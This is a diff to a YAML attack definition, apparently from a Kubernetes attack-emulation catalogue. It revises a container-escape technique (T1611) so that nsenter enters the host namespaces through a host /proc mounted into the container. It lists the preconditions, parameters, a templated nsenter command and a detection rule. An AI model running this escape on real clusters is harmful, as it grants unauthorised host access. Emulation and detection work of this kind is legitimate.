@@ -1,21 +1,24 @@
-name: Escape container via NSenter
-description: Container escape via the nsenter built-in linux program that allows
-  executing a binary into another namespace.
+name: Escape container via NSenter and mounted host proc
+description: Enter host namespaces through a host /proc filesystem mounted into the container.
 tactic: "Privilege Escalation"
-techniques: [ "Escape to Host", T1611 ]
+techniques: ["Escape to Host", T1611]
 preconditions:
   kind: Pod
   "Pod.securityContext.privileged": true
-  "Pod.securityContext.hostPID": true
+  "Pod.hostPath": /proc
   accessLevel: "user-exec"
   linuxNamespaceAccess: [mount, uts, pid]
 effects:
   - container.escape(sys)
 parameters:
+  HOST_PROC:
+    type: string
+    default: "${SRC.HOST_PATH:/proc}"
+    description: in-container mount point of the host /proc filesystem
   TARGET:
     type: int
     default: 1
-    description: the PID whose namespaces to enter
+    description: the host PID whose namespaces to enter
   MOUNT:
     type: bool
     default: true
@@ -41,14 +44,15 @@ parameters:
     default: hostname
     description: the command to execute on the host
 procedures:
-  - key: nsenter
+  - key: nsenter-host-proc
+    tool: nsenter
     command: >-
-      nsenter --target ${TARGET}
-      {% if MOUNT %}--mount{% endif %}
-      {% if UTS %}--uts{% endif %}
-      {% if IPC %}--ipc{% endif %}
-      {% if NET %}--net{% endif %}
-      {% if PID %}--pid{% endif %}
+      nsenter
+      {% if MOUNT %}--mount={{ HOST_PROC | shell_quote }}/${TARGET}/ns/mnt{% endif %}
+      {% if UTS %}--uts={{ HOST_PROC | shell_quote }}/${TARGET}/ns/uts{% endif %}
+      {% if IPC %}--ipc={{ HOST_PROC | shell_quote }}/${TARGET}/ns/ipc{% endif %}
+      {% if NET %}--net={{ HOST_PROC | shell_quote }}/${TARGET}/ns/net{% endif %}
+      {% if PID %}--pid={{ HOST_PROC | shell_quote }}/${TARGET}/ns/pid{% endif %}
       ${CMD}
 defend:
   - tactic: detect
@@ -59,4 +63,3 @@ defend:
     process_creation: nsenter
 references:
   - https://attack.mitre.org/techniques/T1611/
-  - "[https://kubehound.io/reference/attacks/CE_NSENTER](KubeHound CE_NSENTER)"
